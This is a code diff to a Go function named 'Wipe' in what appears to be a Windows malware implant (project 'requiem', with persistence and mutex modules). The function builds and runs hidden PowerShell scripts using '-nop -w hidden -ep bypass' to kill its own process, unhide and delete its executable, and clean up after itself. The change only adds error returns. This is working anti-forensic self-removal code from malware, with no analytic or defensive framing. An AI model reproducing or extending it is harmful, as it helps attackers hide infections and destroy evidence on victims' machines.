@@ -1,6 +1,7 @@
 package funcs
 
 import (
+	"errors"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -12,8 +13,11 @@ import (
 	"requiem/utils"
 )
 
-func Wipe(secure bool) {
-	persistence.Unpersist()
+func Wipe(secure bool) error {
+	unpersist := persistence.Unpersist()
+	if unpersist == false {
+		return errors.New("failed to unpersist")
+	}
 
 	utils.RemoveMutex()
 
@@ -21,7 +25,7 @@ func Wipe(secure bool) {
 
 	var wipe strings.Builder
 	wipe.WriteString("sleep 1\n")
-	fmt.Fprintf(&wipe, "kill -Id %d -Force\n", os.Getpid())
+	fmt.Fprintf(&wipe, "kill -id %d -force\n", os.Getpid())
 	fmt.Fprintf(&wipe, "attrib -h -s %q\n", store.ExecPath)
 	fmt.Fprintf(&wipe, "rm -fo '%s'\n", store.ExecPath)
 
@@ -37,7 +41,7 @@ func Wipe(secure bool) {
 
 		err := os.WriteFile(cipherPath, []byte(cipher.String()), 0666)
 		if err != nil {
-			return
+			return err
 		}
 
 		fmt.Fprintf(&wipe, "start powershell -Args '-nop -w hidden -ep bypass -file %q' -w hidden\n", cipherPath)
@@ -50,11 +54,13 @@ func Wipe(secure bool) {
 
 	err := os.WriteFile(wipePath, []byte(wipe.String()), 0666)
 	if err != nil {
-		return
+		return err
 	}
 
 	cmd := utils.StartCommand("powershell", "-nop", "-w", "hidden", "-ep", "bypass", "-file", wipePath)
 	cmd.Start()
 
 	os.Exit(0)
+
+	return nil
 }
